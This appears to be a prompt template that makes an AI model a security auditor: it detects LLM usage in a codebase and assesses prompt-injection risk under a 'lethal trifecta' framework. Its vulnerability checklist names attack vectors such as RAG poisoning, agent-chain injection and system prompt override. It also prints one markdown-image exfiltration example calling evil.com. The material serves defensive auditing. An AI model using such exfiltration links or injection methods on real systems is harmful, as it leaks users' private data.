version=2
# Prompt Injection and LLM Security Assessment

You are a security auditor specializing in LLM and prompt injection vulnerabilities. First, identify all LLM usage in this codebase, then analyze for security issues based on the "lethal trifecta" framework and other known attack vectors.

**IMPORTANT**: If this repository does not use LLMs, AI models, or any LLM-based infrastructure, simply respond with:
"No LLM usage detected - prompt injection review not relevant for this repository."

## Part 1: LLM Usage Detection and Documentation

### 1.1 LLM Infrastructure Identification

Scan the entire codebase using multiple detection strategies:

#### Detection Strategy 1: Library and Package Detection

Look for these in imports, requirements, dependencies, and package files:

- **API-based LLMs:**
  - OpenAI (GPT-3.5, GPT-4, GPT-4 Turbo, GPT-5, text-davinci, etc.)
  - Anthropic (Claude, Claude 2, Claude 3, etc.)
  - Google (PaLM, Gemini, Bard API, etc.)
  - Mistral, Cohere, AI21, Replicate, etc.
  
- **Local/Self-hosted Models:**
  - HuggingFace Transformers
  - Ollama
  - llama.cpp
  - GGML/GGUF models
  - vLLM, TGI, or other inference servers
  
- **LLM Frameworks & Tools:**
  - LangChain, LlamaIndex
  - Semantic Kernel, Haystack
  - Model Context Protocol (MCP)
  - AutoGPT, BabyAGI, or other agent frameworks
  - Vector databases (Pinecone, Weaviate, Chroma, FAISS, etc.)

#### Detection Strategy 2: Import/Include Pattern Matching

Search for import/require/include statements across all languages (case-insensitive):

**Python:**
- `import anthropic` or `from anthropic`
- `import openai` or `from openai`
- `import google.generativeai` or `from google.generativeai`
- `import transformers` or `from transformers`

**JavaScript/TypeScript:**
- `require('openai')` or `require("openai")`
- `import OpenAI from 'openai'`
- `import { Anthropic } from '@anthropic-ai/sdk'`
- `import { GoogleGenerativeAI } from '@google/generative-ai'`

**Java:**
- `import com.openai.*`
- `import com.anthropic.*`
- `import com.google.cloud.aiplatform.*`

**C#/.NET:**
- `using OpenAI;`
- `using Azure.AI.OpenAI;`
- `using Anthropic;`

**Go:**
- `import "github.com/sashabaranov/go-openai"`
- `import "github.com/anthropics/anthropic-sdk-go"`

**Ruby:**
- `require 'openai'`
- `gem 'ruby-openai'`

**PHP:**
- `use OpenAI\Client;`
- `require_once 'vendor/openai-php/client';`

**Rust:**
- `use openai_api_rust::*;`
- `use anthropic::*;`

Any variations with underscores, hyphens, or different casing

#### Detection Strategy 3: API Client Instantiation Patterns

Look for direct API client creation across languages:

**Python:**
- `Anthropic(` or `anthropic.Anthropic(`
- `OpenAI(` or `openai.OpenAI(`
- `GoogleGenerativeAI(`

**JavaScript/TypeScript:**
- `new OpenAI({` or `new OpenAI(`
- `new Anthropic({` or `new Anthropic(`
- `new ChatGPTAPI(`
- `new GoogleGenerativeAI(`

**Java:**
- `new OpenAiService(`
- `OpenAI.builder()`
- `AnthropicClient.create(`
- `VertexAI.init(`

**C#/.NET:**
- `new OpenAIClient(`
- `new AnthropicClient(`
- `new AzureOpenAIClient(`

**Go:**
- `openai.NewClient(`
- `anthropic.NewClient(`
- `azopenai.NewClient(`

**Ruby:**
- `OpenAI::Client.new(`
- `Anthropic::Client.new(`

**PHP:**
- `OpenAI::client(`
- `new OpenAIClient(`
- `Anthropic::factory(`

**Generic Patterns (any language):**
- Any class/object ending in `Client`, `API`, `Service`, `Analyzer`, `Generator` with LLM-related context
- Constructor calls with `apiKey`, `api_key`, `token` parameters

#### Detection Strategy 4: API Method Call Patterns

Search for characteristic API method calls across languages:

**Common Patterns (most languages):**
- `.messages.create(` (Anthropic pattern)
- `.chat.completions.create(` (OpenAI pattern)
- `.completions.create(`
- `.generateContent(` or `.generate_content(`
- `.generateText(` or `.generate_text(`
- `.complete(` or `.completion(`
- `.invoke(` with prompt/text parameters
- `.predict(` with text parameters
- `.embed(` or `.embeddings.create(`
- `.createCompletion(`
- `.createChatCompletion(`
- `.sendMessage(` or `.send_message(`

**JavaScript/TypeScript specific:**
- `.chat.completions.create({`
- `.generateContent({`
- `await openai.createCompletion(`
- `.run(` with prompt parameter

**Java specific:**
- `.createCompletion(`
- `.generateMessage(`
- `.predict(`

**C#/.NET specific:**
- `.GetCompletionsAsync(`
- `.CompleteAsync(`
- `.GenerateMessageAsync(`

**Go specific:**
- `.CreateCompletion(`
- `.CreateChatCompletion(`
- `.Generate(`

**HTTP/REST patterns (any language):**
- POST requests to `api.openai.com`, `api.anthropic.com`, `generativelanguage.googleapis.com`
- Headers with `Authorization: Bearer` or `x-api-key`
- Request bodies with `prompt`, `messages`, `model` fields

#### Detection Strategy 5: Configuration and Environment Variables

Look for LLM-related configuration:
- Environment variables: `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `CLAUDE_API_KEY`, etc.
- Config files with: `api_key`, `model`, `temperature`, `max_tokens`
- Model names in strings: "gpt-", "claude-", "text-davinci", "gemini", etc.

#### Detection Strategy 6: Prompt-Related Patterns

Search for prompt handling code:
- Variables/parameters named: `prompt`, `system_prompt`, `user_prompt`, `messages`
- Template strings with placeholders: `{context}`, `{input}`, `{question}`
- Prompt construction: string concatenation with user input
- Files with extensions: `.prompt`, `.tmpl`, or directories named `prompts`

#### Detection Strategy 7: Custom Implementation Patterns

Look for custom wrapper classes or modules:
- Files/classes with names containing: `llm`, `ai`, `ml`, `claude`, `gpt`, `analyzer`, `generator`
- Classes that have methods like `analyze`, `generate`, `complete`, `predict` with text parameters
- Any file that processes text and returns AI-generated responses

- **Prompt Engineering:**
  - Prompt templates or prompt management systems
  - Few-shot learning examples
  - Chain-of-thought prompting
  - System prompts or instruction templates

### 1.2 File Analysis Instructions

When analyzing the repository structure:

1. **Priority Files to Examine:**
   - Any file with names containing: `llm`, `ai`, `ml`, `claude`, `gpt`, `openai`, `anthropic`, `analyzer`, `generator`
   - Configuration files: `config.*`, `settings.*`, `.env`, `application.properties`, `appsettings.json`
   - Package/dependency files:
     - Python: `requirements.txt`, `pyproject.toml`, `Pipfile`, `poetry.lock`, `setup.py`
     - JavaScript/TypeScript: `package.json`, `package-lock.json`, `yarn.lock`
     - Java: `pom.xml`, `build.gradle`, `build.gradle.kts`
     - C#/.NET: `*.csproj`, `packages.config`, `*.fsproj`
     - Go: `go.mod`, `go.sum`
     - Ruby: `Gemfile`, `Gemfile.lock`
     - PHP: `composer.json`, `composer.lock`
     - Rust: `Cargo.toml`, `Cargo.lock`
   - Main application files that might orchestrate AI functionality
   - Files in directories named: `ai`, `ml`, `llm`, `models`, `prompts`, `agents`

2. **Code Patterns to Flag:**
   - Any class or function that takes text input and returns generated text
   - Methods that build or manipulate prompts
   - API key handling or authentication for external services
   - HTTP requests to known AI service endpoints
   - Model loading or initialization code

3. **Don't Be Misled By:**
   - Comments or documentation mentioning LLMs (focus on actual implementation)
   - Test files that mock LLM behavior (note these separately)
   - Example code that isn't actually used

### 1.3 Example Detection Scenarios

The following are real-world patterns that MUST be detected across different languages:

**Scenario 1: Custom Wrapper Class (Python)**
```python
# File: claude_analyzer.py
from anthropic import Anthropic

class ClaudeAnalyzer:
    def __init__(self, api_key: str):
        self.client = Anthropic(api_key=api_key)
    
    def analyze(self, prompt: str):
        response = self.client.messages.create(...)
```
**Detection:** Custom analyzer class wrapping Anthropic API

**Scenario 2: TypeScript/Node.js Service**
```typescript
// File: ai-service.ts
import OpenAI from 'openai';

export class AIService {
    private openai: OpenAI;
    
    constructor() {
        this.openai = new OpenAI({
            apiKey: process.env.OPENAI_API_KEY
        });
    }
    
    async generateResponse(prompt: string) {
        const completion = await this.openai.chat.completions.create({
            messages: [{ role: "user", content: prompt }],
            model: "gpt-4"
        });
        return completion.choices[0].message.content;
    }
}
```
**Detection:** TypeScript service class using OpenAI

**Scenario 3: Java Spring Boot Integration**
```java
// File: LLMService.java
@Service
public class LLMService {
    private final OpenAiService openAiService;
    
    public LLMService(@Value("${openai.api.key}") String apiKey) {
        this.openAiService = new OpenAiService(apiKey);
    }
    
    public String generateText(String prompt) {
        CompletionRequest request = CompletionRequest.builder()
            .prompt(prompt)
            .model("text-davinci-003")
            .build();
        return openAiService.createCompletion(request).getChoices().get(0).getText();
    }
}
```
**Detection:** Java service with OpenAI integration

**Scenario 4: C# .NET API Controller**
```csharp
// File: AIController.cs
[ApiController]
public class AIController : ControllerBase
{
    private readonly OpenAIClient _client;
    
    public AIController(IConfiguration configuration)
    {
        _client = new OpenAIClient(configuration["OpenAI:ApiKey"]);
    }
    
    [HttpPost("generate")]
    public async Task<IActionResult> Generate([FromBody] string prompt)
    {
        var response = await _client.GetCompletionsAsync(prompt);
        return Ok(response);
    }
}
```
**Detection:** C# controller with OpenAI client

**Scenario 5: Go HTTP Handler**
```go
// File: handler.go
import (
    "github.com/sashabaranov/go-openai"
)

func HandleGeneration(w http.ResponseWriter, r *http.Request) {
    client := openai.NewClient(os.Getenv("OPENAI_API_KEY"))
    
    resp, err := client.CreateChatCompletion(
        context.Background(),
        openai.ChatCompletionRequest{
            Model: openai.GPT4,
            Messages: []openai.ChatCompletionMessage{
                {Role: "user", Content: prompt},
            },
        },
    )
}
```
**Detection:** Go HTTP handler using OpenAI

**Scenario 6: Direct HTTP API Calls (Any Language)**
```javascript
// File: api-client.js
async function callClaude(prompt) {
    const response = await fetch('https://api.anthropic.com/v1/messages', {
        method: 'POST',
        headers: {
            'x-api-key': process.env.ANTHROPIC_API_KEY,
            'anthropic-version': '2023-06-01',
            'content-type': 'application/json'
        },
        body: JSON.stringify({
            model: 'claude-3-opus-20240229',
            messages: [{ role: 'user', content: prompt }]
        })
    });
    return response.json();
}
```
**Detection:** Direct HTTP calls to LLM APIs

### 1.4 Detailed Usage Documentation

For EACH LLM usage found, document:

#### Usage #[N]: [Component/Feature Name]

**Type:** [API/Local/Framework]
**Technology:** [Specific LLM or framework]
**Location:**

- Files: `path/to/file1.ext`, `path/to/file2.ext`
- Key Classes/Functions: [list them]

**Purpose:** [What this LLM usage accomplishes]

**Configuration:**

- Model: [model name/version]
- Temperature: [if configured]
- Max tokens: [if configured]
- Other parameters: [list any]

**Data Flow:**

- **Input Sources:** [Where data comes from - user input, database, files, APIs, etc.]
- **Processing:** [How the LLM processes this data]
- **Output Destinations:** [Where results go - UI, database, files, external APIs, etc.]

**Access Controls:**

- Authentication required: [YES/NO]
- Authorization checks: [Describe any]
- Rate limiting: [YES/NO]

**Example Code:**

```[language]
// Show actual implementation snippet
```

---

### 1.3 LLM Usage Summary

**Total LLM Integrations Found:** [count]

**Primary Use Cases:**

1. [Main purpose 1]
2. [Main purpose 2]
3. [etc.]

**External Dependencies:**

- API Keys Required: [list which services]
- Models to Download: [list any local models]
- Additional Services: [vector DBs, etc.]

## Part 2: Security Vulnerability Assessment

Based on the LLM usage identified above, analyze for security vulnerabilities:

### 2.1 The Lethal Trifecta Analysis

For EACH LLM usage identified in Part 1, evaluate if it has all three dangerous components:

#### Component 1: Access to Private Data

**Check each LLM integration for:**

- Database access with sensitive data
- File system access to confidential documents
- API access to internal services
- Access to user PII or credentials
- Integration with private repositories

#### Component 2: Ability to Externally Communicate

**Check each LLM integration for:**

- HTTP/HTTPS request capabilities
- Email or messaging functionality
- File creation in publicly accessible locations
- API calls to external services
- Pull request/issue creation capabilities
- Webhook or callback mechanisms

#### Component 3: Exposure to Untrusted Content

**Check each LLM integration for:**

- Direct user input processing
- Reading from public sources (issues, PRs, comments)
- Processing external API responses
- Ingesting web content or scraped data
- Handling uploaded files or documents
- Processing data from third-party integrations

**Lethal Trifecta Assessment per Usage:**

| LLM Usage | Private Data | External Comm | Untrusted Input | Risk Level |
|-----------|--------------|---------------|-----------------|------------|
| Usage #1  | YES/NO       | YES/NO        | YES/NO          | CRITICAL/HIGH/MEDIUM/LOW |
| Usage #2  | YES/NO       | YES/NO        | YES/NO          | CRITICAL/HIGH/MEDIUM/LOW |

### 2.2 Specific Vulnerability Checks

For each LLM integration identified, check for these vulnerabilities:

#### 2.2.1 String Concatenation Issues

- **Location:** Check for direct string concatenation of user input with prompts
- **Pattern:** Look for patterns like `prompt = "Translate: " + user_input`
- **Risk:** Direct prompt injection through malicious user input

#### 2.2.2 Markdown Exfiltration Vectors

- **Location:** Check if the system renders Markdown from LLM outputs
- **Pattern:** Look for unfiltered Markdown rendering, especially images
- **Risk:** Data exfiltration via `![](https://evil.com?data=...)`

#### 2.2.3 Tool/Function Calling Security

- **Location:** Check LLM tool/function calling implementations
- **Pattern:** Look for unrestricted tool access or missing validation
- **Risk:** Malicious instructions triggering sensitive actions

#### 2.2.4 Insufficient Input Sanitization

- **Location:** Check all points where external data enters prompts
- **Pattern:** Missing or weak input validation/sanitization
- **Risk:** Injection of system prompt overrides

#### 2.2.5 System Prompt Protection

- **Location:** Check system prompt handling
- **Pattern:** Relying on "prompt begging" or weak instructions
- **Risk:** System prompt override attacks

#### 2.2.6 Output Validation

- **Location:** Check how LLM outputs are used
- **Pattern:** Direct execution or rendering without validation
- **Risk:** Code injection, XSS, or command execution

#### 2.2.7 MCP Security Issues

- **Location:** Check for Model Context Protocol usage
- **Pattern:** Multiple MCP servers with dangerous combinations
- **Risk:** Combining servers that create the lethal trifecta

#### 2.2.8 Retrieval Augmented Generation (RAG) Issues

- **Location:** Check vector database and retrieval systems
- **Pattern:** Untrusted documents in retrieval corpus
- **Risk:** Poisoned context injection

#### 2.2.9 Multi-Agent Security

- **Location:** Check agent-to-agent communication
- **Pattern:** Agents trusting outputs from other agents
- **Risk:** Cascading prompt injection through agent chains

#### 2.2.10 API Key and Secret Management

- **Location:** Check LLM API key storage and usage
- **Pattern:** Hardcoded keys, client-side exposure
- **Risk:** Unauthorized API usage and cost attacks

## Part 3: Vulnerability Report

### 3.1 Detailed Vulnerability Findings

For each vulnerability found, provide:

#### Issue #[N]: [Vulnerability Name]

**Severity:** CRITICAL | HIGH | MEDIUM | LOW
**Type:** [Prompt Injection | Data Exfiltration | Access Control | etc.]
**Affected LLM Usage:** [Reference Usage #N from Part 1]
**Location:**

- File: `path/to/file.ext`
- Line(s): [specific line numbers]
- Function/Class: [if applicable]

**Vulnerable Pattern:**

```[language]
// Show the actual vulnerable code
```

**Attack Scenario:**
[Describe how an attacker could exploit this]

**Example Attack:**

```text
[Show a concrete prompt injection or attack example]
```

**Mitigation:**
[Specific fix recommendation]

**Secure Implementation:**

```[language]
// Show the corrected code
```

---

### 3.2 Risk Assessment Summary

#### Overall Lethal Trifecta Status

- [ ] Access to Private Data: [YES/NO - explain]
- [ ] External Communication: [YES/NO - explain]
- [ ] Untrusted Input Exposure: [YES/NO - explain]
- **Overall Risk:** [CRITICAL if all 3, HIGH if 2, MEDIUM if 1]

#### Key Findings

1. **Most Critical Issue:** [Describe the highest risk vulnerability]
2. **Attack Surface:** [List main entry points for attacks]
3. **Data at Risk:** [What sensitive data could be exposed]

#### Required Mitigations

1. **Immediate:** [Critical fixes needed for vulnerabilities found]
2. **Short-term:** [Important fixes for issues identified]
3. **Long-term:** [Architectural changes needed for current problems]

#### Current Security Implementation Gaps

- Input validation issues found
- Output filtering problems identified
- Monitoring implementation weaknesses
- Rate limiting implementation issues

### 3.3 Additional Security Considerations

#### Security Control Implementation Status

Document which security controls are present or absent:
- [ ] Input validation layer [Present/Absent]
- [ ] Output sanitization [Present/Absent]
- [ ] Prompt injection detection [Present/Absent]
- [ ] Rate limiting [Present/Absent]
- [ ] Audit logging [Present/Absent]
- [ ] Domain allow-listing [Present/Absent]

#### Security Implementation Assessment

- [ ] Principle of least privilege for LLM tools [Implemented/Not Implemented]
- [ ] Separation of trusted/untrusted contexts [Implemented/Not Implemented]
- [ ] Secure prompt template management [Implemented/Not Implemented]
- [ ] Security testing [Implemented/Not Implemented]

**Note:** Focus on actual vulnerabilities present in the code with specific file locations and line numbers. Avoid theoretical risks without concrete evidence in the codebase.

---

## Repository Structure and Files

{repo_structure}
